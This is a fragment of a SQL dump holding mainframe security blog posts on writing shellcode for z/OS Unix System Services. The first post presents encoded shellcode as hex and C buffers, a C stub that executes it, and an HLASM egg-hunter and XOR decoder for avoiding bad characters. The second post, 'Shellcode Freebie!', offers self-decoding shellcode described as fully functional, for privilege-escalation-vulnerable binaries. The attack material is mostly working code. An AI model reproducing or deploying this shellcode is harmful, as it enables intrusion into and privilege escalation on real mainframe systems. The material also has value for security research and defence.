144(4,R13),228(R14)0x1f175f2e (???)       58e0d088     L       R14,136(,R13)......(dbx64) 0x1f175e90/0xf4h1f175e90:  90 eb d0 0c c0 f0 ff ff ff fe 58 00 f0 28 58 f01f175ea0:  f0 2c 58 e0 00 10 58 ee 03 04 58 ee 00 a0 b2 181f175eb0:  e0 00 a7 f4 00 07 00 00 00 10 00 d8 00 00 00 061f175ec0:  18 fd 18 d1 50 f0 d0 04 50 d0 f0 08 58 10 f0 181f175ed0:  41 a0 00 d8 1e ad 50 a0 d0 48 c0 30 00 00 00 771f175ee0:  eb eb d0 94 00 26 c0 b0 00 00 00 75 41 20 00 001f175ef0:  50 20 d0 80 41 e0 00 07 50 e0 d0 84 41 e0 d0 801f175f00:  50 e0 d0 88 18 e2 50 e0 d0 90 d2 03 d0 90 e0 101f175f10:  58 e0 d0 90 d2 03 d0 90 e2 20 58 e0 d0 90 d2 031f175f20:  d0 90 e0 18 58 e0 d0 90 d2 03 d0 90 e0 e4 58 e01f175f30:  d0 88 1f 00 43 00 e0 00 58 f0 d0 90 41 e0 d0 801f175f40:  41 40 d0 84 41 10 d0 4c 50 40 d0 4c 18 4b 50 401f175f50:  d0 50 50 e0 d0 54 50 00 d0 58 50 00 d0 5c 50 e01f175f60:  d0 60 50 00 d0 64 50 00 d0 68 50 e0 d0 6c 50 001f175f70:  d0 70 50 e0 d0 74 50 e0 d0 78 50 e0 d0 7c d2 031f175f80:  d0 08 d0 48(dbx64) 0x1f175e90/0xf4h &gt; tmp.buf</span>\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n4)  Format the shellcode, I use a python script for this which takes the binary name, output file name, beginning offset and ending offset.   The output can be C buffer style or assembler an assembler constant declaration, for use in another assembly program (such as the decoder used to de-obfuscate it).  This one is built with each byte XOR’d with 0x01 to remove nulls.\n\n\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n<span style=\"color: #808080;\">*Number of bytes:  240\r\n*Enc buffer char:  0x1\r\n*\r\n*ASM buffer:\r\n         DC    X\'91edd10dc1f1fefefeff198ec1b10101016351d1b10519daa60401X\r\n               06c3d6e6f0c4e6c2410101c101fefefefa16100b09510181cd59f181X\r\n               cdc1e101010142407181e151718189407181d95171818d407181d151X\r\n               71819151718195517181995171819d517181a1517181a5517181a951X\r\n               7181ad517181b1517181b5517181b940\'\r\n         DC    X\'11818946f181bd0101010101010101010101010101010101010101X\r\n               01010101010101010101010101010101010101010101010101010101X\r\n               01018101010104ee59d1b10599edd10d16fe06ff0101010101010101X\r\n               0101010101016083889460a389010101010601010101dfacbfeef1f1X\r\n               f1f1\'</span><span style=\"color: #808080;\">\r\n\r\nEncoded C buffer:\r\n\"\\x91\\xed\\xd1\\x0d\\xc1\\xf1\\xfe\\xfe\\xfe\\xff\\x19\\x8e\\xc1\\xb1\\x01\\x01\"\r\n\"\\x01\\x63\\x51\\xd1\\xb1\\x05\\x19\\xda\\xa6\\x04\\x01\\x06\\xc3\\xd6\\xe6\\xf0\"\r\n\"\\xc4\\xe6\\xc2\\x41\\x01\\x01\\xc1\\x01\\xfe\\xfe\\xfe\\xfa\\x16\\x10\\x0b\\x09\"\r\n\"\\x51\\x01\\x81\\xcd\\x59\\xf1\\x81\\xcd\\xc1\\xe1\\x01\\x01\\x01\\x42\\x40\\x71\"\r\n\"\\x81\\xe1\\x51\\x71\\x81\\x89\\x40\\x71\\x81\\xd9\\x51\\x71\\x81\\x8d\\x40\\x71\"\r\n\"\\x81\\xd1\\x51\\x71\\x81\\x91\\x51\\x71\\x81\\x95\\x51\\x71\\x81\\x99\\x51\\x71\"\r\n\"\\x81\\x9d\\x51\\x71\\x81\\xa1\\x51\\x71\\x81\\xa5\\x51\\x71\\x81\\xa9\\x51\\x71\"\r\n\"\\x81\\xad\\x51\\x71\\x81\\xb1\\x51\\x71\\x81\\xb5\\x51\\x71\\x81\\xb9\\x40\\x11\"\r\n\"\\x81\\x89\\x46\\xf1\\x81\\xbd\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\r\n\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\r\n\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\r\n\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x81\\x01\\x01\\x01\\x04\\xee\\x59\\xd1\"\r\n\"\\xb1\\x05\\x99\\xed\\xd1\\x0d\\x16\\xfe\\x06\\xff\\x01\\x01\\x01\\x01\\x01\\x01\"\r\n\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x60\\x83\\x88\\x94\\x60\\xa3\\x89\\x01\"\r\n\"\\x01\\x01\\x01\\x06\\x01\\x01\\x01\\x01\\xdf\\xac\\xbf\\xee\\xf1\\xf1\\xf1\\xf1\"\r\n</span>\r\n			\r\n				\r\n					\r\n				\r\n					1234567891011121314151617181920212223242526272829303132\r\n				\r\n						<span style=\"color: #808080;\">*Number of bytes:  240*Enc buffer char:  0x1**ASM buffer:         DC    X\'91edd10dc1f1fefefeff198ec1b10101016351d1b10519daa60401X               06c3d6e6f0c4e6c2410101c101fefefefa16100b09510181cd59f181X               cdc1e101010142407181e151718189407181d95171818d407181d151X               71819151718195517181995171819d517181a1517181a5517181a951X               7181ad517181b1517181b5517181b940\'         DC    X\'11818946f181bd0101010101010101010101010101010101010101X               01010101010101010101010101010101010101010101010101010101X               01018101010104ee59d1b10599edd10d16fe06ff0101010101010101X               0101010101016083889460a389010101010601010101dfacbfeef1f1X               f1f1\'</span><span style=\"color: #808080;\"> Encoded C buffer:\"\\x91\\xed\\xd1\\x0d\\xc1\\xf1\\xfe\\xfe\\xfe\\xff\\x19\\x8e\\xc1\\xb1\\x01\\x01\"\"\\x01\\x63\\x51\\xd1\\xb1\\x05\\x19\\xda\\xa6\\x04\\x01\\x06\\xc3\\xd6\\xe6\\xf0\"\"\\xc4\\xe6\\xc2\\x41\\x01\\x01\\xc1\\x01\\xfe\\xfe\\xfe\\xfa\\x16\\x10\\x0b\\x09\"\"\\x51\\x01\\x81\\xcd\\x59\\xf1\\x81\\xcd\\xc1\\xe1\\x01\\x01\\x01\\x42\\x40\\x71\"\"\\x81\\xe1\\x51\\x71\\x81\\x89\\x40\\x71\\x81\\xd9\\x51\\x71\\x81\\x8d\\x40\\x71\"\"\\x81\\xd1\\x51\\x71\\x81\\x91\\x51\\x71\\x81\\x95\\x51\\x71\\x81\\x99\\x51\\x71\"\"\\x81\\x9d\\x51\\x71\\x81\\xa1\\x51\\x71\\x81\\xa5\\x51\\x71\\x81\\xa9\\x51\\x71\"\"\\x81\\xad\\x51\\x71\\x81\\xb1\\x51\\x71\\x81\\xb5\\x51\\x71\\x81\\xb9\\x40\\x11\"\"\\x81\\x89\\x46\\xf1\\x81\\xbd\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x81\\x01\\x01\\x01\\x04\\xee\\x59\\xd1\"\"\\xb1\\x05\\x99\\xed\\xd1\\x0d\\x16\\xfe\\x06\\xff\\x01\\x01\\x01\\x01\\x01\\x01\"\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x60\\x83\\x88\\x94\\x60\\xa3\\x89\\x01\"\"\\x01\\x01\\x01\\x06\\x01\\x01\\x01\\x01\\xdf\\xac\\xbf\\xee\\xf1\\xf1\\xf1\\xf1\"</span>\r\n					\r\n				\r\n			\r\n		\r\n\r\n\n5)  Test with a stub program, the following is a tried and true method for jumping to your buffer.\n\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n<span style=\"color: #808080;\">int main() {\r\n        unsigned char sc[] =\r\n\"\\x91\\xed\\xd1\\x0d\\xc1\\xf1\\xfe\\xfe\\xfe\\xff\\x19\\x8e\\xc1\\xb1\\x01\\x01\"\r\n\"\\x01\\x63\\x51\\xd1\\xb1\\x05\\x19\\xda\\xa6\\x04\\x01\\x06\\xc3\\xd6\\xe6\\xf0\"\r\n\"\\xc4\\xe6\\xc2\\x41\\x01\\x01\\xc1\\x01\\xfe\\xfe\\xfe\\xfa\\x16\\x10\\x0b\\x09\"\r\n\"\\x51\\x01\\x81\\xcd\\x59\\xf1\\x81\\xcd\\xc1\\xe1\\x01\\x01\\x01\\x42\\x40\\x71\"\r\n\"\\x81\\xe1\\x51\\x71\\x81\\x89\\x40\\x71\\x81\\xd9\\x51\\x71\\x81\\x8d\\x40\\x71\"\r\n\"\\x81\\xd1\\x51\\x71\\x81\\x91\\x51\\x71\\x81\\x95\\x51\\x71\\x81\\x99\\x51\\x71\"\r\n\"\\x81\\x9d\\x51\\x71\\x81\\xa1\\x51\\x71\\x81\\xa5\\x51\\x71\\x81\\xa9\\x51\\x71\"\r\n\"\\x81\\xad\\x51\\x71\\x81\\xb1\\x51\\x71\\x81\\xb5\\x51\\x71\\x81\\xb9\\x40\\x11\"\r\n\"\\x81\\x89\\x46\\xf1\\x81\\xbd\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\r\n\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\r\n\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\r\n\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x81\\x01\\x01\\x01\\x04\\xee\\x59\\xd1\"\r\n\"\\xb1\\x05\\x99\\xed\\xd1\\x0d\\x16\\xfe\\x06\\xff\\x01\\x01\\x01\\x01\\x01\\x01\"\r\n\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x60\\x83\\x88\\x94\\x60\\xa3\\x89\\x01\"\r\n\"\\x01\\x01\\x01\\x06\\x01\\x01\\x01\\x01\\xdf\\xac\\xbf\\xee\\xf1\\xf1\\xf1\\xf1\";\r\n\r\n     int (*ret)();\r\n     ret = (int(*)())(sc);\r\n    (int)(*ret)();\r\n    return 0;\r\n}</span>\r\n			\r\n				\r\n					\r\n				\r\n					1234567891011121314151617181920212223\r\n				\r\n						<span style=\"color: #808080;\">int main() {        unsigned char sc[] =\"\\x91\\xed\\xd1\\x0d\\xc1\\xf1\\xfe\\xfe\\xfe\\xff\\x19\\x8e\\xc1\\xb1\\x01\\x01\"\"\\x01\\x63\\x51\\xd1\\xb1\\x05\\x19\\xda\\xa6\\x04\\x01\\x06\\xc3\\xd6\\xe6\\xf0\"\"\\xc4\\xe6\\xc2\\x41\\x01\\x01\\xc1\\x01\\xfe\\xfe\\xfe\\xfa\\x16\\x10\\x0b\\x09\"\"\\x51\\x01\\x81\\xcd\\x59\\xf1\\x81\\xcd\\xc1\\xe1\\x01\\x01\\x01\\x42\\x40\\x71\"\"\\x81\\xe1\\x51\\x71\\x81\\x89\\x40\\x71\\x81\\xd9\\x51\\x71\\x81\\x8d\\x40\\x71\"\"\\x81\\xd1\\x51\\x71\\x81\\x91\\x51\\x71\\x81\\x95\\x51\\x71\\x81\\x99\\x51\\x71\"\"\\x81\\x9d\\x51\\x71\\x81\\xa1\\x51\\x71\\x81\\xa5\\x51\\x71\\x81\\xa9\\x51\\x71\"\"\\x81\\xad\\x51\\x71\\x81\\xb1\\x51\\x71\\x81\\xb5\\x51\\x71\\x81\\xb9\\x40\\x11\"\"\\x81\\x89\\x46\\xf1\\x81\\xbd\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\"\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x81\\x01\\x01\\x01\\x04\\xee\\x59\\xd1\"\"\\xb1\\x05\\x99\\xed\\xd1\\x0d\\x16\\xfe\\x06\\xff\\x01\\x01\\x01\\x01\\x01\\x01\"\"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x60\\x83\\x88\\x94\\x60\\xa3\\x89\\x01\"\"\\x01\\x01\\x01\\x06\\x01\\x01\\x01\\x01\\xdf\\xac\\xbf\\xee\\xf1\\xf1\\xf1\\xf1\";      int (*ret)();     ret = (int(*)())(sc);    (int)(*ret)();    return 0;}</span>\r\n					\r\n				\r\n			\r\n		\r\n\r\nOnce you have working shellcode, then it’s time to remove bad characters (such as nulls 0x00) so the string can be copied across the network, piped on a command line, or read via environment variable (or whichever deployment method you choose).\nSince there are no virus protection programs on the mainframe systems (yet?) simple encoding should suffice.   Here’s a stub I wrote in HLASM that finds the buffer via egg hunter (for ease of separation later).  Then, simply XORs a block of code with a static byte to yield the predetermined shellcode (which was XOR d with the same byte, prior to implementation to prevent bad characters).\nThe offsets will depend on buffer size and location.   The plan is to refine, then combine, this along with the scripts that build the above into a tool set that can easily generate workable shellcode.  The obtuse coding is a combo of this being an early draft and the need to not have any 00’s in the resulting object code.\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n<span style=\"color: #808080;\">    17         AFI   1,X\'01010102\'  # this value</span>\r\n<span style=\"color: #808080;\">    18         AFI   2,X\'01010103\'  # xor\'d with this one</span>\r\n<span style=\"color: #808080;\">    19         XR    1,2            # yields a 1 in R1</span>\r\n<span style=\"color: #808080;\">    20         LR    4,1            #  will put a 4 in R4</span>\r\n<span style=\"color: #808080;\">    21         SLA   4,1(1)         # make R1 == 4</span>\r\n<span style=\"color: #808080;\">    22         XR    10,10          # zeroout R10 for our egg</span>\r\n<span style=\"color: #808080;\">    23         XR    2,2            # zero R2</span>\r\n<span style=\"color: #808080;\">    24         LGFI  10,X\'deadbeef\' # load egghunter value into R10</span>\r\n<span style=\"color: #808080;\">    25         LR    11,12          # load  base int R11</span>\r\n<span style=\"color: #808080;\">    26  LOOPER AR    11,1           # add 1 to R11</span>\r\n<span style=\"color: #808080;\">    27         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0</span>\r\n<span style=\"color: #808080;\">    28         CR    10,3           # compare egg with R11 mem pointer</span>\r\n<span style=\"color: #808080;\">    29         BRC   7,LOOPER       # branch anything but equal</span>\r\n<span style=\"color: #808080;\">    30         AR    11,4           # add 4 to R11</span>\r\n<span style=\"color: #808080;\">    31         L     3,1(2,11)      # get value R11+1 (R2 index is 0)</span>\r\n<span style=\"color: #808080;\">    32         CR    10,3           # compare egg with R11 mem pointer</span>\r\n<span style=\"color: #808080;\">    33         BRC   7,LOOPER       # 2nd check 2 in a row good to go!</span>\r\n<span style=\"color: #808080;\">    34         XR    2,2            # zero 2 for division</span>\r\n<span style=\"color: #808080;\">    35         XR    3,3            # zero 3 for division</span>\r\n<span style=\"color: #808080;\">    36         AR    11,1           # 1 for the offset from above</span>\r\n<span style=\"color: #808080;\">    37         SR    11,4           # 4 to skip last egg\r\n    38         ST    13,4(,11)      # store sp for later in wkg area\r\n    39         ST    11,8(,13)      # store sc addr in  wkg area</span>\r\n<span style=\"color: #808080;\">....</span>\r\n<span style=\"color: #808080;\">    42  ** Begin main decoding routine    **</span>\r\n<span style=\"color: #808080;\">    43         LR    3,11          # put egg addr in 5 - dont mod</span>\r\n<span style=\"color: #808080;\">    44         AR    3,4           # add 4 to 3</span>\r\n<span style=\"color: #808080;\">    45         AR    3,4           # add 4 to 3</span>\r\n<span style=\"color: #808080;\">    46         AR    3,4           # add 4 to 3</span>\r\n<span style=\"color: #808080;\">    47         AR    3,4           # add 4 to 3 points to SC now</span>\r\n<span style=\"color: #808080;\">    48         LR    5,3           # put egg addr in 3</span>\r\n<span style=\"color: #808080;\">    49         SR    3,1           # dec R3 by 1 (for nulls (&amp; lulz?))\r\n*  R3 now holds addr-1 of our sc</span>\r\n<span style=\"color: #808080;\">    50         LR    4,1           # put 1 in R4</span>\r\n<span style=\"color: #808080;\">    51         XR    1,1           # zeroout R1</span>\r\n<span style=\"color: #808080;\">    52         XR    2,2           # zeroout R2</span>\r\n<span style=\"color: #808080;\">    53  * put the XOR key (enc buffer char) from buf in the quotes below</span>\r\n<span style=\"color: #808080;\">    54         XI    1(3),X\'01\'    # xor byte with key (r3 offset by 1)</span>\r\n<span style=\"color: #808080;\">    55  LOOP2  AR    1,4           # add 1 to R1</span>\r\n<span style=\"color: #808080;\">    56         ARK   2,3,1         # add r3 to r1 ctr yield r2 ptr</span>\r\n<span style=\"color: #808080;\">    57  * put the XOR key (enc buffer char) from buf in the quotes below</span>\r\n<span style=\"color: #808080;\">    58         XI    1(2),X\'01\'    # xor byte with key</span>\r\n<span style=\"color: #808080;\">    59  * put the buffer len (# of bytes) in the next cmd in CHI 1,&lt;here&gt;\r\n        * may need increase size above 256 to remove 00\'s from obj code</span>\r\n<span style=\"color: #808080;\">    60         CHI   1,257         # to yield sc len</span>\r\n<span style=\"color: #808080;\">    61         BRC   4,LOOP2       # loop bwd 18 bytes if R1 &lt; size</span>\r\n<span style=\"color: #808080;\">    62         XR    4,4</span>\r\n<span style=\"color: #808080;\">......</span>\r\n<span style=\"color: #808080;\">    67         DC    X\'DEADBEEF\'     #egg</span>\r\n<span style=\"color: #808080;\">    68         DC    X\'DEADBEEF\'\r\n    69         DC    X\'DEADBEEF\'\r\n    70         DC    X\'DEADBEEF\'      \r\n......\r\n    79  *Number of bytes:     240\r\n    81  *Enc buffer char:     0x1\r\n    84   DC X\'91edd10dc1f1fefefeff198ec1b10101016351d1b10519daa60401X\r\n    85      06c3d6e6f0c4e6c2410101c101fefefefa16100b09510181cd59f181X\r\n    86      cdc1e101010142407181e151718189407181d95171818d407181d151X\r\n    87      71819151718195517181995171819d517181a1517181a5517181a951X\r\n    88      7181ad517181b1517181b5517181b940\'\r\n    89   DC X\'11818946f181bd0101010101010101010101010101010101010101X\r\n    90      01010101010101010101010101010101010101010101010101010101X\r\n    91      01018101010104ee59d1b10599edd10d16fe06ff0101010101010101X\r\n    92      0101010101016083889460a389010101010601010101dfacbfeef1f1X\r\n    93      f1f1\'\r\n.....\r\n   100         DC    X\'8BADF00D\'   eof marker\r\n   101         END\r\n</span>\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869\r\n				\r\n						<span style=\"color: #808080;\">    17         AFI   1,X\'01010102\'  # this value</span><span style=\"color: #808080;\">    18         AFI   2,X\'01010103\'  # xor\'d with this one</span><span style=\"color: #808080;\">    19         XR    1,2            # yields a 1 in R1</span><span style=\"color: #808080;\">    20         LR    4,1            #  will put a 4 in R4</span><span style=\"color: #808080;\">    21         SLA   4,1(1)         # make R1 == 4</span><span style=\"color: #808080;\">    22         XR    10,10          # zeroout R10 for our egg</span><span style=\"color: #808080;\">    23         XR    2,2            # zero R2</span><span style=\"color: #808080;\">    24         LGFI  10,X\'deadbeef\' # load egghunter value into R10</span><span style=\"color: #808080;\">    25         LR    11,12          # load  base int R11</span><span style=\"color: #808080;\">    26  LOOPER AR    11,1           # add 1 to R11</span><span style=\"color: #808080;\">    27         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0</span><span style=\"color: #808080;\">    28         CR    10,3           # compare egg with R11 mem pointer</span><span style=\"color: #808080;\">    29         BRC   7,LOOPER       # branch anything but equal</span><span style=\"color: #808080;\">    30         AR    11,4           # add 4 to R11</span><span style=\"color: #808080;\">    31         L     3,1(2,11)      # get value R11+1 (R2 index is 0)</span><span style=\"color: #808080;\">    32         CR    10,3           # compare egg with R11 mem pointer</span><span style=\"color: #808080;\">    33         BRC   7,LOOPER       # 2nd check 2 in a row good to go!</span><span style=\"color: #808080;\">    34         XR    2,2            # zero 2 for division</span><span style=\"color: #808080;\">    35         XR    3,3            # zero 3 for division</span><span style=\"color: #808080;\">    36         AR    11,1           # 1 for the offset from above</span><span style=\"color: #808080;\">    37         SR    11,4           # 4 to skip last egg    38         ST    13,4(,11)      # store sp for later in wkg area    39         ST    11,8(,13)      # store sc addr in  wkg area</span><span style=\"color: #808080;\">....</span><span style=\"color: #808080;\">    42  ** Begin main decoding routine    **</span><span style=\"color: #808080;\">    43         LR    3,11          # put egg addr in 5 - dont mod</span><span style=\"color: #808080;\">    44         AR    3,4           # add 4 to 3</span><span style=\"color: #808080;\">    45         AR    3,4           # add 4 to 3</span><span style=\"color: #808080;\">    46         AR    3,4           # add 4 to 3</span><span style=\"color: #808080;\">    47         AR    3,4           # add 4 to 3 points to SC now</span><span style=\"color: #808080;\">    48         LR    5,3           # put egg addr in 3</span><span style=\"color: #808080;\">    49         SR    3,1           # dec R3 by 1 (for nulls (&amp; lulz?))*  R3 now holds addr-1 of our sc</span><span style=\"color: #808080;\">    50         LR    4,1           # put 1 in R4</span><span style=\"color: #808080;\">    51         XR    1,1           # zeroout R1</span><span style=\"color: #808080;\">    52         XR    2,2           # zeroout R2</span><span style=\"color: #808080;\">    53  * put the XOR key (enc buffer char) from buf in the quotes below</span><span style=\"color: #808080;\">    54         XI    1(3),X\'01\'    # xor byte with key (r3 offset by 1)</span><span style=\"color: #808080;\">    55  LOOP2  AR    1,4           # add 1 to R1</span><span style=\"color: #808080;\">    56         ARK   2,3,1         # add r3 to r1 ctr yield r2 ptr</span><span style=\"color: #808080;\">    57  * put the XOR key (enc buffer char) from buf in the quotes below</span><span style=\"color: #808080;\">    58         XI    1(2),X\'01\'    # xor byte with key</span><span style=\"color: #808080;\">    59  * put the buffer len (# of bytes) in the next cmd in CHI 1,&lt;here&gt;        * may need increase size above 256 to remove 00\'s from obj code</span><span style=\"color: #808080;\">    60         CHI   1,257         # to yield sc len</span><span style=\"color: #808080;\">    61         BRC   4,LOOP2       # loop bwd 18 bytes if R1 &lt; size</span><span style=\"color: #808080;\">    62         XR    4,4</span><span style=\"color: #808080;\">......</span><span style=\"color: #808080;\">    67         DC    X\'DEADBEEF\'     #egg</span><span style=\"color: #808080;\">    68         DC    X\'DEADBEEF\'    69         DC    X\'DEADBEEF\'    70         DC    X\'DEADBEEF\'      ......    79  *Number of bytes:     240    81  *Enc buffer char:     0x1    84   DC X\'91edd10dc1f1fefefeff198ec1b10101016351d1b10519daa60401X    85      06c3d6e6f0c4e6c2410101c101fefefefa16100b09510181cd59f181X    86      cdc1e101010142407181e151718189407181d95171818d407181d151X    87      71819151718195517181995171819d517181a1517181a5517181a951X    88      7181ad517181b1517181b5517181b940\'    89   DC X\'11818946f181bd0101010101010101010101010101010101010101X    90      01010101010101010101010101010101010101010101010101010101X    91      01018101010104ee59d1b10599edd10d16fe06ff0101010101010101X    92      0101010101016083889460a389010101010601010101dfacbfeef1f1X    93      f1f1\'.....   100         DC    X\'8BADF00D\'   eof marker   101         END</span>\r\n					\r\n				\r\n			\r\n		\r\n\r\nMore to come on the details and inner-workings of these steps, as well as ideas about fuzzing / finding vulnerable USS apps and what to do if you find one.  Have I piqued your interest? If so make sure you see my talk at DEFCON23 on Saturday, August 8 at 5pm in Las Vegas.\nSome great resources:\nzArchitecture Principles of Operations\nDBX debugger for UNIX\nNote – the above examples are not meant to be followed as a step-by-step how-to.   Rather, they are meant to get the reader started, with ideas and examples that can easily be modified or expanded upon to create working models.', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/creating-shellcode-to-run-in-uss/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (44, 'Mainframe security research – perfectly summed up in this short video', 'bigendiansmalls', '2015-07-22T11:40:14+00:00', '', 'Mainframe, Security', 'https://www.bigendiansmalls.com/mainframe-security-research-perfectly-summed-up-in-this-short-video/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (45, 'Shellcode Freebie!', 'bigendiansmalls', '2015-07-15T08:02:22+00:00', 'Got a burning privesc vulnerable binary on your  USS? How about feeding it a little self-decoding shellcode?  (Hint this is fully functional, find a C stub and try it yourself!).\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n\"\\x90\\xec\\xd0\\x0c\\xc0\\xf0\\xff\\xff\\xff\\xfe\\x18\\xcf\\x17\\x11\\x17\\x22\"\r\n\"\\x17\\x33\\xc2\\x19\\x01\\x01\\x01\\x02\\xc2\\x29\\x01\\x01\\x01\\x03\\x17\\x12\"\r\n\"\\x18\\x41\\x8b\\x40\\x10\\x01\\x17\\xaa\\x17\\x22\\xc0\\xa1\\xde\\xad\\xbe\\xef\"\r\n\"\\x18\\xbc\\x1a\\xb1\\x58\\x32\\xb0\\x01\\x19\\xa3\\xa7\\x74\\xff\\xfc\\x1a\\xb4\"\r\n\"\\x58\\x32\\xb0\\x01\\x19\\xa3\\xa7\\x74\\xff\\xf6\\x17\\x22\\x17\\x33\\x1a\\xb1\"\r\n\"\\x1b\\xb4\\x50\\xd0\\xb0\\x04\\x50\\xb0\\xd0\\x08\\x18\\xdb\\x18\\x3b\\x1a\\x34\"\r\n\"\\x1a\\x34\\x1a\\x34\\x1a\\x34\\x18\\x53\\x1b\\x31\\x18\\x41\\x17\\x11\\x17\\x22\"\r\n\"\\x97\\x02\\x30\\x01\\x1a\\x14\\xb9\\xf8\\x10\\x23\\x97\\x02\\x20\\x01\\xa7\\x1e\"\r\n\"\\x01\\x70\\xa7\\x44\\xff\\xf9\\x17\\x44\\x58\\xd4\\xb0\\x04\\x0d\\xe5\\xde\\xad\"\r\n\"\\xbe\\xef\\xde\\xad\\xbe\\xef\\xde\\xad\\xbe\\xef\\xde\\xad\\xbe\\xef\\x92\\xe9\"\r\n\"\\xd2\\x0e\\xc2\\xf2\\xfd\\xfd\\xfd\\xfc\\x5a\\x02\\xf2\\x2a\\x5a\\xf2\\xf2\\x2e\"\r\n\"\\x5a\\xe2\\x02\\x12\\x5a\\xec\\x01\\x06\\x5a\\xec\\x02\\xa2\\xb0\\x1a\\xe2\\x02\"\r\n\"\\xa5\\xf6\\x02\\x05\\x02\\x02\\x02\\x12\\x02\\xda\\x02\\x02\\x02\\x04\\x1a\\xff\"\r\n\"\\x1a\\xd3\\x52\\xf2\\xd2\\x06\\x52\\xd2\\xf2\\x0a\\x5a\\x12\\xf2\\x1a\\x43\\xa2\"\r\n\"\\x02\\xda\\x1c\\xaf\\x52\\xa2\\xd2\\x4a\\xc2\\x32\\x02\\x02\\x02\\x75\\xe9\\xe9\"\r\n\"\\xd2\\x96\\x02\\x24\\xc2\\xb2\\x02\\x02\\x02\\x77\\x43\\x22\\x02\\x02\\x52\\x22\"\r\n\"\\xd2\\x82\\x43\\xe2\\x02\\x05\\x52\\xe2\\xd2\\x86\\x43\\xe2\\xd2\\x82\\x52\\xe2\"\r\n\"\\xd2\\x8a\\x1a\\xe0\\x52\\xe2\\xd2\\x92\\xd0\\x01\\xd2\\x92\\xe2\\x12\\x5a\\xe2\"\r\n\"\\xd2\\x92\\xd0\\x01\\xd2\\x92\\xe0\\x22\\x5a\\xe2\\xd2\\x92\\xd0\\x01\\xd2\\x92\"\r\n\"\\xe2\\x1a\\x5a\\xe2\\xd2\\x92\\xd0\\x01\\xd2\\x92\\xe2\\xe6\\x5a\\xe2\\xd2\\x8a\"\r\n\"\\x1d\\x02\\x41\\x02\\xe2\\x02\\x5a\\xf2\\xd2\\x92\\x43\\xe2\\xd2\\x82\\x43\\x42\"\r\n\"\\xd2\\x86\\x43\\x12\\xd2\\x4e\\x52\\x42\\xd2\\x4e\\x1a\\x49\\x52\\x42\\xd2\\x52\"\r\n\"\\x52\\xe2\\xd2\\x56\\x52\\x02\\xd2\\x5a\\x52\\x02\\xd2\\x5e\\x52\\xe2\\xd2\\x62\"\r\n\"\\x52\\x02\\xd2\\x66\\x52\\x02\\xd2\\x6a\\x52\\xe2\\xd2\\x6e\\x52\\x02\\xd2\\x72\"\r\n\"\\x52\\xe2\\xd2\\x76\\x52\\xe2\\xd2\\x7a\\x52\\xe2\\xd2\\x7e\\xd0\\x01\\xd2\\x0a\"\r\n\"\\xd2\\x4a\\x0f\\xed\\x1a\\xf0\\xe9\\xe9\\xd2\\x96\\x02\\x94\\x1a\\x1f\\x5a\\xd2\"\r\n\"\\xd2\\x06\\x52\\xf2\\xd2\\x12\\xc2\\xf2\\x02\\x02\\x02\\x02\\x5a\\x02\\xf2\\x32\"\r\n\"\\xa5\\xfa\\x02\\x01\\x5a\\xe2\\x02\\x12\\x5a\\xec\\x01\\x06\\x5a\\xec\\x02\\xce\"\r\n\"\\xb0\\x1a\\xe2\\x02\\x5a\\xf2\\xd2\\x12\\x5a\\xe2\\xd2\\x0e\\x9a\\x19\\xd2\\x1a\"\r\n\"\\x05\\xfc\\x02\\x02\\x02\\x02\\x02\\x12\\x02\\xda\\x02\\x02\\x02\\x02\\x63\\x80\"\r\n\"\\x8b\\x97\\x63\\xa0\\x8a\\x02\\xce\\xd7\\xfd\\xf1\\xfd\\xfd\\xfc\\x86\\x02\\x82\"\r\n\"\\x42\\x03\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\xfd\\xf1\\x02\\x02\"\r\n\"\\x02\\x96\\x02\\x06\\x96\\x83\\x8b\\x97\\x82\\x02\\xf2\\xf2\\xf2\\xf2\\x8b\\xad\"\r\n\"\\xf0\\xf0\"\r\n			